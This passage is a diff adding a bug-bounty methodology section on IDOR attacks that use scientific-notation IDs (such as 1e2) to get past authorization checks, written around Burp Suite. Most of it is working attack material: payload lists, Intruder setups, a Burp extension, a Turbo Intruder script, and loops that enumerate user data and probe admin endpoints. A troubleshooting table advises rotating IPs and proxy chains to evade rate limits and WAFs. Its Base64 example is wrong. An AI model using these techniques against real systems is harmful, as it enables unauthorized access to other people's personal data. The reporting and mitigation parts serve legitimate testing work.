@@ -5185,3 +5185,514 @@ admin,root,test,backup,dev
 
 ---
 
+# 🎯 **Bug #10: Scientific Notation IDOR - Full Burp Suite Methodology**
+
+## 📋 **Bug Description**
+**IDOR via Scientific Notation** - Using scientific notation (e.g., `1e2` for 100) to bypass input validation and access unauthorized resources.
+
+---
+
+## 🔍 **DETECTION PHASE**
+
+### **Step 1: Initial Reconnaissance**
+
+#### **A. Identify Potential Endpoints**
+1. **Map the application** using Burp Spider/Content Discovery:
+```bash
+# Target URLs to look for
+/profile?id=100
+/user/100
+/api/user/100
+/download?file_id=100
+/order/100
+```
+
+2. **Burp Configuration:**
+```
+Target → Site Map → Right-click → Engage Tool → Discover Content
+```
+
+3. **Look for patterns in:**
+- URL paths (`/user/123`)
+- Query parameters (`?user_id=123`)
+- POST bodies (`{"id": 123}`)
+- RESTful endpoints (`/api/v1/users/123`)
+
+#### **B. Parameter Discovery**
+Use **Burp Intruder** with parameter wordlists:
+
+1. **Load request in Repeater**
+2. **Send to Intruder** (Ctrl+I)
+3. **Positions tab**: Clear §, add § around parameter values
+4. **Payloads**: Load parameter names list
+```
+id
+user_id
+uid
+account_id
+profile_id
+file_id
+document_id
+order_id
+ref_id
+reference
+```
+
+---
+
+## 🧪 **TESTING PHASE**
+
+### **Step 2: Baseline Testing**
+
+#### **A. Identify Valid IDs**
+1. **Capture a request** with a valid ID:
+```
+GET /api/user/100 HTTP/1.1
+Host: target.com
+Cookie: session=abc123
+```
+
+2. **Send to Intruder** for ID enumeration:
+```
+GET /api/user/§100§ HTTP/1.1
+```
+
+**Payload settings:**
+- Payload type: Numbers
+- Range: 1-200
+- Step: 1
+
+3. **Analyze responses:**
+- **200 OK** - Valid ID (your own)
+- **403 Forbidden** - Valid but unauthorized
+- **404 Not Found** - Invalid ID
+- **302 Redirect** - Possible valid ID
+
+#### **B. Verify IDOR Vulnerability**
+Test simple sequential ID changes:
+1. Send original request to Repeater
+2. Change `100` to `101`
+3. Check response:
+   - If you see another user's data → **IDOR confirmed**
+   - If 403/404 → Continue testing
+
+---
+
+### **Step 3: Scientific Notation Testing**
+
+#### **A. Basic Scientific Notation**
+Convert decimal IDs to scientific notation:
+
+**Original:** `id=100`
+**Scientific notation:** `id=1e2`
+
+**Burp Repeater Process:**
+1. **Send request to Repeater**
+2. **Modify parameter:**
+```
+GET /api/user/1e2 HTTP/1.1
+```
+3. **Check response:**
+   - If same as `id=100` → Scientific notation accepted
+   - If different → Server not parsing scientific notation
+
+#### **B. Scientific Notation Variations**
+
+| Decimal | Scientific | Test Cases |
+|---------|------------|------------|
+| 100 | 1e2 | `/user/1e2` |
+| 200 | 2e2 | `/user/2e2` |
+| 1000 | 1e3 | `/user/1e3` |
+| 123 | 1.23e2 | `/user/1.23e2` |
+| 50 | 5e1 | `/user/5e1` |
+
+#### **C. Edge Cases Testing**
+```
+1e0  (equals 1)
+1e1  (equals 10)
+1.5e2 (equals 150)
+-1e2 (negative scientific)
++1e2 (positive sign)
+1E2 (uppercase E)
+1e+2 (explicit positive exponent)
+1e-2 (fraction - usually not valid for IDs)
+```
+
+---
+
+## ⚙️ **BURP INTRUDER CONFIGURATION**
+
+### **Step 4: Automated Scientific Notation Testing**
+
+#### **A. Payload Generation**
+
+**Method 1: Custom Payload List**
+Create a file `scientific_notation.txt`:
+```
+1e0
+1e1
+1e2
+2e2
+3e2
+4e2
+5e2
+1e3
+2e3
+1.5e2
+1.23e2
+1E2
+1e+2
+```
+
+**Method 2: Burp Intruder Payload Processing**
+
+1. **Load number list** (1-1000)
+2. **Add Payload Processing:**
+```
+Add prefix: ""
+Add suffix: ""
+Add rule: Convert to scientific notation
+```
+
+**Custom payload processing rule:**
+```python
+# Using Burp's Extension (Python)
+def process(payload):
+    num = int(payload)
+    return f"{num:e}"  # Scientific notation
+```
+
+#### **B. Intruder Attack Configuration**
+
+**Attack Type:** Sniper
+
+**Resource Pool:**
+- Threads: 5-10 (avoid rate limiting)
+- Throttle: 100-200ms between requests
+
+**Grep - Extract:**
+Configure to extract:
+- Response status code
+- Content-Length
+- Response time
+- Error messages
+- User identifiers
+
+**Grep - Match:**
+Add strings to identify successful IDOR:
+- "unauthorized"
+- "forbidden"
+- other usernames
+- email addresses
+- personal data patterns
+
+---
+
+## 📊 **RESPONSE ANALYSIS**
+
+### **Step 5: Result Analysis**
+
+#### **A. Compare Responses**
+
+**Original Request (id=100):**
+```
+HTTP/1.1 200 OK
+Content-Length: 2450
+{
+  "id": 100,
+  "username": "current_user",
+  "email": "user@test.com"
+}
+```
+
+**Scientific Notation Request (id=1e2):**
+```
+HTTP/1.1 200 OK
+Content-Length: 2450  ← Same length indicates success
+{
+  "id": 100,
+  "username": "current_user",
+  "email": "user@test.com"
+}
+```
+
+#### **B. Successful IDOR Indicators**
+
+When testing other user IDs with scientific notation:
+
+**Victim ID 101 (decimal):**
+```
+HTTP/1.1 403 Forbidden
+```
+
+**Victim ID 101 (scientific: 1.01e2):**
+```
+HTTP/1.1 200 OK
+Content-Length: 2450
+{
+  "id": 101,
+  "username": "victim_user",  ← Different username
+  "email": "victim@test.com"   ← Different email
+}
+```
+
+#### **C. Burp Intruder Result Sorting**
+
+1. **Sort by Status Code:**
+   - 200 OK (potential hits)
+   - 302 Found (redirects)
+   - 500 Error (possible bypass)
+
+2. **Sort by Content-Length:**
+   - Group similar lengths
+   - Identify anomalies
+   - Compare with baseline
+
+3. **Sort by Response Time:**
+   - Faster responses might indicate cached/valid data
+   - Slower responses might indicate DB lookups
+
+---
+
+## 🔬 **ADVANCED TECHNIQUES**
+
+### **Step 6: Bypass Validation**
+
+#### **A. Combined Encoding**
+Test scientific notation with other encodings:
+
+**URL Encoded:**
+```
+GET /api/user/1e2      → Normal
+GET /api/user/1%65%32  → URL encoded 'e' and '2'
+GET /api/user/1%45%32  → URL encoded 'E' and '2'
+```
+
+**Double URL Encoded:**
+```
+1e2 → %31%65%32 → %2531%2565%2532
+```
+
+**Base64 + Scientific:**
+```
+1e2 → MSU2NSUzMg== (Base64)
+```
+
+#### **B. Parameter Pollution with Scientific Notation**
+
+```
+GET /api/user?id=100&id=1.01e2
+GET /api/user?id=100&id[]=1.01e2
+GET /api/user?user_id=100&id=1.01e2
+```
+
+#### **C. JSON Body Testing**
+
+```json
+{
+  "id": "1.01e2",
+  "user_id": 100,
+  "data": {
+    "reference": "1.01e2"
+  }
+}
+```
+
+---
+
+## 🛠️ **BURP EXTENSIONS FOR IDOR**
+
+### **Step 7: Useful Extensions**
+
+#### **A. Install via BApp Store:**
+
+1. **Autorize** - Automate authorization tests
+2. **Authz** - Test with different cookies
+3. **JSON Web Tokens** - Decode/modify JWT
+4. **Param Miner** - Discover hidden parameters
+5. **Backslash Powered Scanning** - Advanced scanning
+
+#### **B. Custom Extension for Scientific Notation**
+
+```python
+# Simple Burp Extension for Scientific Notation Testing
+from burp import IBurpExtender, IIntruderPayloadProcessor
+
+class BurpExtender(IBurpExtender, IIntruderPayloadProcessor):
+    def registerExtenderCallbacks(self, callbacks):
+        self._callbacks = callbacks
+        self._helpers = callbacks.getHelpers()
+        callbacks.setExtensionName("Scientific Notation Generator")
+        callbacks.registerIntruderPayloadProcessor(self)
+    
+    def getProcessorName(self):
+        return "Scientific Notation Converter"
+    
+    def processPayload(self, currentPayload, originalPayload, baseValue):
+        try:
+            num = int(currentPayload.tostring())
+            scientific = "{:e}".format(num)
+            return self._helpers.stringToBytes(scientific)
+        except:
+            return currentPayload
+```
+
+---
+
+## 📈 **SCALING THE ATTACK**
+
+### **Step 8: Automated Scanning**
+
+#### **A. Burp Intruder Cluster Bomb Attack**
+
+**Position 1:** User IDs (1-1000)
+**Position 2:** Scientific Notation Flags
+
+Payload sets:
+1. Numbers: 1-1000
+2. Formats: ["", "e", "E", "e+", "E+", ".0e"]
+
+#### **B. Turbo Intruder Script**
+
+```python
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=10,
+                           requestsPerConnection=100,
+                           pipeline=False)
+
+    for id in range(1, 1000):
+        scientific = f"{id:e}"
+        engine.queue(target.req, [scientific])
+        
+        # Test variations
+        engine.queue(target.req, [scientific.upper()])
+        engine.queue(target.req, [scientific.replace('e', 'e+')])
+```
+
+---
+
+## 🔐 **EXPLOITATION**
+
+### **Step 9: Exploiting the Vulnerability**
+
+Once a scientific notation IDOR is found:
+
+#### **A. Data Extraction**
+```
+# Enumerate all users
+for id in range(1, 1000):
+    scientific = f"{id:e}"
+    response = burp_request(f"/api/user/{scientific}")
+    if "username" in response:
+        extract_data(response)
+```
+
+#### **B. Privilege Escalation**
+```
+# Find admin IDs (often low numbers)
+admin_candidates = [1, 10, 100, 1000]
+for id in admin_candidates:
+    scientific = f"{id:e}"
+    response = burp_request(f"/api/admin/{scientific}")
+    if response.status == 200:
+        print(f"Admin access with {scientific}")
+```
+
+#### **C. Chaining with Other Vulnerabilities**
+1. Extract user IDs via scientific notation
+2. Use extracted IDs for further attacks
+3. Combine with XSS in user profile data
+
+---
+
+## 📝 **REPORTING**
+
+### **Step 10: Documentation Template**
+
+```markdown
+# IDOR via Scientific Notation Bypass
+
+## Vulnerability Details
+- **Endpoint:** /api/user/{id}
+- **Parameter:** id (path parameter)
+- **Method:** GET
+- **Severity:** High
+
+## Description
+The application accepts scientific notation (e.g., 1e2) in the ID parameter,
+bypassing the authorization check that works for decimal IDs.
+
+## Steps to Reproduce
+1. Login as user 'attacker' (ID: 100)
+2. Access legitimate profile: /api/user/100
+3. Attempt to access victim ID 101: /api/user/101 → 403 Forbidden
+4. Convert to scientific notation: /api/user/1.01e2
+5. Observe victim's data returned: 200 OK
+
+## Proof of Concept
+```
+Request:
+GET /api/user/1.01e2 HTTP/1.1
+Host: target.com
+Cookie: session=attacker_session
+
+Response:
+HTTP/1.1 200 OK
+{
+  "id": 101,
+  "username": "victim",
+  "email": "victim@target.com",
+  "ssn": "XXX-XX-XXXX"
+}
+```
+
+## Impact
+- Unauthorized access to all user profiles
+- Data breach of PII
+- Potential account takeover
+
+## Remediation
+- Implement strict input validation
+- Use allowlist for numeric values
+- Enforce authorization on parsed value
+```
+
+---
+
+## 🛡️ **MITIGATION CHECKLIST**
+
+For developers to fix this issue:
+
+- [ ] Disable scientific notation parsing in ID parameters
+- [ ] Use regex: `^\d+$` for numeric IDs
+- [ ] Implement server-side authorization checks
+- [ ] Use indirect reference maps (UUIDs)
+- [ ] Add rate limiting on API endpoints
+- [ ] Log and monitor unusual parameter formats
+
+---
+
+## 🎯 **KEY SUCCESS INDICATORS**
+
+Look for these signs of successful exploitation:
+
+1. **Same content-length** as valid requests
+2. **Different usernames/emails** in response
+3. **200 OK** status codes for other users' data
+4. **No CSRF tokens** required for sensitive data
+5. **Consistent response times** indicating valid data retrieval
+
+---
+
+## ⚠️ **TROUBLESHOOTING**
+
+| Problem | Solution |
+|---------|----------|
+| Rate limiting detected | Add delays, rotate IPs, use proxy chains |
+| WAF blocking | Try different encodings, lowercase/uppercase |
+| No scientific notation support | Try other techniques from the master list |
+| Session expires | Automate re-authentication |
+
+---
+
